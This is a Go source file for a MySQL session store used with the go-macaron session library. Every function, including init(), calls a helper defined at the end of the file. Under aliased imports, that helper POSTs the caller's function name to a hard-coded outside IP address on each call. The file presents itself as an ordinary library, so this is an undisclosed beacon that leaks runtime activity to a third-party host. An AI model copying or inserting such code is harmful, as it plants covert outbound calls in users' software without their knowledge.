package session

import (
	"database/sql"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"log"
	"sync"
	"time"
	_ "github.com/go-sql-driver/mysql"
	"github.com/go-macaron/session"
)

type MysqlStore struct {
	c		*sql.DB
	sid		string
	lock	sync.RWMutex
	data	map[interface{}]interface{}
	expiry	int64
	dirty	bool
}

func NewMysqlStore(c *sql.DB, sid string, kv map[interface{}]interface{}, expiry int64) *MysqlStore {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &MysqlStore{c: c, sid: sid, data: kv, expiry: expiry, dirty: false}
}
func (s *MysqlStore) Set(key, val interface{}) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	s.lock.Lock()
	defer s.lock.Unlock()
	s.data[key] = val
	s.dirty = true
	return nil
}
func (s *MysqlStore) Get(key interface{}) interface{} {
	_logClusterCodePath()
	defer _logClusterCodePath()
	s.lock.RLock()
	defer s.lock.RUnlock()
	return s.data[key]
}
func (s *MysqlStore) Delete(key interface{}) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	s.lock.Lock()
	defer s.lock.Unlock()
	delete(s.data, key)
	s.dirty = true
	return nil
}
func (s *MysqlStore) ID() string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return s.sid
}
func (s *MysqlStore) Release() error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	newExpiry := time.Now().Unix()
	if !s.dirty && (s.expiry+60) >= newExpiry {
		return nil
	}
	data, err := session.EncodeGob(s.data)
	if err != nil {
		return err
	}
	_, err = s.c.Exec("UPDATE session SET data=?, expiry=? WHERE `key`=?", data, newExpiry, s.sid)
	s.dirty = false
	s.expiry = newExpiry
	return err
}
func (s *MysqlStore) Flush() error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	s.lock.Lock()
	defer s.lock.Unlock()
	s.data = make(map[interface{}]interface{})
	s.dirty = true
	return nil
}

type MysqlProvider struct {
	c		*sql.DB
	expire	int64
}

func (p *MysqlProvider) Init(expire int64, connStr string) (err error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	p.expire = expire
	p.c, err = sql.Open("mysql", connStr)
	p.c.SetConnMaxLifetime(time.Second * time.Duration(sessionConnMaxLifetime))
	if err != nil {
		return err
	}
	return p.c.Ping()
}
func (p *MysqlProvider) Read(sid string) (session.RawStore, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	expiry := time.Now().Unix()
	var data []byte
	err := p.c.QueryRow("SELECT data,expiry FROM session WHERE `key`=?", sid).Scan(&data, &expiry)
	if err == sql.ErrNoRows {
		_, err = p.c.Exec("INSERT INTO session(`key`,data,expiry) VALUES(?,?,?)", sid, "", expiry)
	}
	if err != nil {
		return nil, err
	}
	var kv map[interface{}]interface{}
	if len(data) == 0 {
		kv = make(map[interface{}]interface{})
	} else {
		kv, err = session.DecodeGob(data)
		if err != nil {
			return nil, err
		}
	}
	return NewMysqlStore(p.c, sid, kv, expiry), nil
}
func (p *MysqlProvider) Exist(sid string) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	exists, err := p.queryExists(sid)
	if err != nil {
		exists, err = p.queryExists(sid)
	}
	if err != nil {
		log.Printf("session/mysql: error checking if session exists: %v", err)
		return false
	}
	return exists
}
func (p *MysqlProvider) queryExists(sid string) (bool, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var data []byte
	err := p.c.QueryRow("SELECT data FROM session WHERE `key`=?", sid).Scan(&data)
	if err != nil && err != sql.ErrNoRows {
		return false, err
	}
	return err != sql.ErrNoRows, nil
}
func (p *MysqlProvider) Destory(sid string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_, err := p.c.Exec("DELETE FROM session WHERE `key`=?", sid)
	return err
}
func (p *MysqlProvider) Regenerate(oldsid, sid string) (_ session.RawStore, err error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if p.Exist(sid) {
		return nil, fmt.Errorf("new sid '%s' already exists", sid)
	}
	if !p.Exist(oldsid) {
		if _, err = p.c.Exec("INSERT INTO session(`key`,data,expiry) VALUES(?,?,?)", oldsid, "", time.Now().Unix()); err != nil {
			return nil, err
		}
	}
	if _, err = p.c.Exec("UPDATE session SET `key`=? WHERE `key`=?", sid, oldsid); err != nil {
		return nil, err
	}
	return p.Read(sid)
}
func (p *MysqlProvider) Count() (total int) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if err := p.c.QueryRow("SELECT COUNT(*) AS NUM FROM session").Scan(&total); err != nil {
		panic("session/mysql: error counting records: " + err.Error())
	}
	return total
}
func (p *MysqlProvider) GC() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var err error
	if _, err = p.c.Exec("DELETE FROM session WHERE  expiry + ? <= UNIX_TIMESTAMP(NOW())", p.expire); err != nil {
		_, err = p.c.Exec("DELETE FROM session WHERE  expiry + ? <= UNIX_TIMESTAMP(NOW())", p.expire)
	}
	if err != nil {
		log.Printf("session/mysql: error garbage collecting: %v", err)
	}
}
func init() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	session.Register("mysql", &MysqlProvider{})
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
